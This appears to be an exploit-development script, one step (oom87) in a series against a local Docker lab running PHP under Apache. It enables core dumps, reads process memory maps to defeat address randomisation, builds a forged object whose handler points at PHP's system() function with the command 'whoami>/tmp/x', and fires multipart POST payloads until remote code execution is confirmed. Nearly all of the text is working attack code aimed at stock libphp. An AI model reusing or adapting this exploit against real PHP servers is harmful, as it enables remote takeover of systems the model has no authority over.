#!/usr/bin/env python3
"""oom87: measure the AIM arm from its own core, then aim.

Contradiction to resolve: oom85 (walk slot=32, marker->crash) + oom86
(slot32=TARGET valid ptr -> silence) imply *TARGET != 1 in AIM arms.
All VA0/stride/rc facts so far came from CAL arms. Measure the AIM arm:
  1. AIM flow, sacrifice@9200000 -> core
  2. locate template copies via T[8:24] (unique intact bytes) ->
     VA0, stride (two consecutive copies), rc bytes at VA0+STRIDE+8,
     handlers bytes at VA0+STRIDE+32 (should be VA0+152)
  3. finishers with T[32] = measured next-copy header (or if rc != 1,
     T[32] = measured rc-bearing address); decode any crash.
"""
import re
import struct
import subprocess
import sys
import time

sys.path.insert(0, '/Users/vlad/Projects/queue/php2shell-lab')
import payload68 as P

HOST = "http://127.0.0.1:8081/oom_sapi.php"
CMD = b"whoami>/tmp/x"
ZIF_SYSTEM = 0x39b8a0
STRIDE_GUESS = 3584


def sh(c, t=120):
    r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
    return (r.stdout + r.stderr).strip()


def post(att):
    import urllib.request
    req = urllib.request.Request(
        HOST, data=att,
        headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            return "200", r.read(300)
    except Exception as e:
        return "ERR", str(e)[:150].encode()


def boot_core_env():
    sh("docker exec php_vuln sh -c \"grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars\"")
    sh("docker exec php_vuln sh -c \"printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf\"")
    sh("docker exec php_vuln sh -c 'rm -f /tmp/core* /tmp/x'")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        if "lim=8M" in sh("curl -s -m 5 " + HOST, 10):
            break
    md5 = sh("docker exec php_vuln md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
    assert md5 == P.STOCK_MD5, md5


def build_tile(libphp_base, VA0, handlers_val=None):
    T = bytearray(176)
    struct.pack_into("<IIII", T, 8, 1, 0x108, 1, 0)
    struct.pack_into("<Q", T, 32, VA0 + 152 if handlers_val is None else handlers_val)
    struct.pack_into("<I", T, 52, 1)
    struct.pack_into("<QII", T, 88, VA0 + 112, 6, 0)
    struct.pack_into("<IIQ", T, 112, 1, 0x106, 0)
    struct.pack_into("<Q", T, 128, len(CMD))
    T[136:136 + len(CMD)] = CMD
    T[136 + len(CMD)] = 0
    struct.pack_into("<QQ", T, 152, 0, libphp_base + ZIF_SYSTEM)
    return bytes(T)


def fetch_core(tag):
    sh("docker cp php_vuln:/tmp/core /tmp/c87_%s" % tag, 240)
    sh("docker cp /tmp/c87_%s phpbuild:/tmp/c87_%s" % (tag, tag), 240)
    return "/tmp/c87_%s" % tag


def gdb_regs(core_in_build):
    out = sh("docker exec phpbuild sh -c 'gdb -q -batch -ex \"info registers rdi rip\" /tmp/libphp.69.so /tmp/%s'" % core_in_build, 240)
    rd = re.search(r"rdi\s+0x([0-9a-f]+)", out)
    rp = re.search(r"rip\s+0x([0-9a-f]+)", out)
    return (int(rd.group(1), 16) if rd else None,
            int(rp.group(1), 16) if rp else None)


def core_pt_loads(data):
    e_phoff = struct.unpack_from("<Q", data, 0x20)[0]
    e_phentsize = struct.unpack_from("<H", data, 0x36)[0]
    e_phnum = struct.unpack_from("<H", data, 0x38)[0]
    segs = []
    for i in range(e_phnum):
        o = e_phoff + i * e_phentsize
        if struct.unpack_from("<I", data, o)[0] != 1:
            continue
        p_off, p_vaddr = struct.unpack_from("<QQ", data, o + 8)
        p_filesz = struct.unpack_from("<Q", data, o + 0x20)[0]
        if p_filesz:
            segs.append((p_vaddr, p_filesz, p_off))
    return segs


def off_to_va(segs, off):
    for va, sz, o in segs:
        if o <= off < o + sz:
            return va + (off - o)
    return None


def analyze_arm(core_host, T):
    """Find all template-copy locations via T[8:24]; report VA, stride,
    rc bytes and handlers bytes at copy1."""
    data = open(core_host, "rb").read()
    segs = core_pt_loads(data)
    pat = T[8:24]
    hits = []
    pos = 0
    while True:
        i = data.find(pat, pos)
        if i < 0:
            break
        va = off_to_va(segs, i - 8)  # va of T[0]
        if va:
            hits.append(va)
        pos = i + 1
    info = {"copies": hits[:8], "n": len(hits)}
    if len(hits) >= 2:
        c0, c1 = hits[0], hits[1]
        info["stride"] = c1 - c0
        for va, sz, o in segs:
            if va <= c1 + 8 and c1 + 16 <= va + sz:
                info["rc8"] = data[o + (c1 + 8 - va):o + (c1 + 16 - va)].hex()
            if va <= c1 + 32 and c1 + 40 <= va + sz:
                info["handlers32"] = data[o + (c1 + 32 - va):o + (c1 + 40 - va)].hex()
    return info


def check_x():
    x = sh("docker exec php_vuln sh -c 'ls -la /tmp/x 2>&1; cat /tmp/x 2>&1'")
    return "No such" not in x, x


print("=== oom87: measure AIM arm from core, then aim ===", flush=True)
boot_core_env()
pid = sh("docker exec php_vuln pgrep -f 'apache2' | head -1").strip()
maps = sh("docker exec php_vuln cat /proc/%s/maps" % pid)
base = heap = None
for ln in maps.splitlines():
    rng = ln.split()[0]
    a, b = [int(x, 16) for x in rng.split("-")]
    perms = ln.split()[1]
    if base is None and "libphp.so" in ln and perms.startswith("r"):
        base = a
    if "libphp.so" not in ln and "/dev/zero" not in ln and "[" not in ln \
            and (b - a) >= 0x200000 and perms.startswith("rw"):
        if heap is None:
            heap = a
VA0g = heap + 0x1718
print("    libphp=0x%x heap=0x%x VA0(guess)=0x%x" % (base, heap, VA0g), flush=True)

T_arm = build_tile(base, VA0g)
print("[1] AIM warm (11)", flush=True)
for i, k1 in enumerate(P.K1S[:-1]):
    post(P.build_attack(k1, 9100000 + i * 100000, value_tile=T_arm))
print("[2] AIM sacrifice@9200000 -> core", flush=True)
for fi in range(3):
    code, resp = post(P.build_attack(3400, 9200000 + fi * 100000, value_tile=T_arm))
    print("  sac-fire%d: %s" % (fi, code), flush=True)
    if code == "200":
        continue
    time.sleep(3)
    cb = fetch_core("sac%d" % fi)
    rdi, rip = gdb_regs("c87_sac%d" % fi)
    print("    rdi=0x%x rip=0x%x" % (rdi or 0, rip or 0), flush=True)
    info = analyze_arm(cb, T_arm)
    print("    ARM FACTS: copies=%s stride=%s rc8=%s handlers32=%s"
          % (info.get("copies"), info.get("stride"), info.get("rc8"),
             info.get("handlers32")), flush=True)
    break
else:
    print("[ABORT] no sacrifice crash to measure", flush=True)
    sys.exit(1)

copies = info.get("copies") or []
if len(copies) < 2:
    print("[ABORT] fewer than 2 copies found", flush=True)
    sys.exit(1)
VA0 = copies[0]
stride = info.get("stride") or STRIDE_GUESS
TARGET = VA0 + stride + 8
rcok = info.get("rc8", "").startswith("01000000")
print("    measured VA0=0x%x stride=%d TARGET=0x%x rc_ok=%s"
      % (VA0, stride, TARGET, rcok), flush=True)
if not rcok:
    print("    rc at target NOT 1 -> aiming at measured rc address fails; measuring marker stride instead", flush=True)
    sys.exit(1)

T_aim = build_tile(base, VA0, handlers_val=TARGET)
print("[3] AIM finishers T[32]=0x%x", flush=True)
won = False
for fi in range(6):
    sb = 9210000 + fi * 4
    code, resp = post(P.build_attack(3400, sb, value_tile=T_aim))
    tag = "fatal" if b"Fatal" in resp else ("clean" if code == "200" else "crash")
    print("  fire%d (%d): %s [%s]" % (fi, sb, code, tag), flush=True)
    time.sleep(2)
    hit, x = check_x()
    if hit:
        print("    /tmp/x: [%s]" % x, flush=True)
        print("*** RCE CONFIRMED (fire%d) ***" % fi, flush=True)
        won = True
        break
    if code != "200":
        time.sleep(3)
        cb2 = fetch_core("f%d" % fi)
        rdi, rip = gdb_regs("c87_f%d" % fi)
        print("    crash rdi=0x%x rip=0x%x (want rdi=TARGET=0x%x)" % (rdi or 0, rip or 0, TARGET), flush=True)
if not won:
    print("[RESULT] no RCE this boot", flush=True)

print("[4] restore", flush=True)
sh("docker exec php_vuln sh -c 'rm -f /etc/apache2/conf-enabled/oomcore.conf && sed -i \"/ulimit -c/d\" /etc/apache2/envvars'")
subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
time.sleep(8)
print("    restored:", sh("curl -s -m 5 " + HOST, 10), flush=True)
